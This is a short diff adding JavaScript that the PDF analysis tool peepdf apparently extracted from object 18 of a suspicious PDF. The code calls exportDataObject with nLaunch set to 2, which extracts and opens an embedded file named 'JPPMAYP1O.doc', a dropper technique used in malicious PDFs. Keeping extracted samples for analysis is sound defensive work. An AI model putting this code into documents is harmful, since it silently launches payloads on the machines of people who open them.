@@ -1,0 +1,7 @@
+// peepdf comment: Javascript code located in object 18 (version 0)
+
+var c = {};
+c["cName"] = 'JPPMAYP1O.doc';
+c["nLaunch"] = 2;
+this["exportDataObject"](c)
+
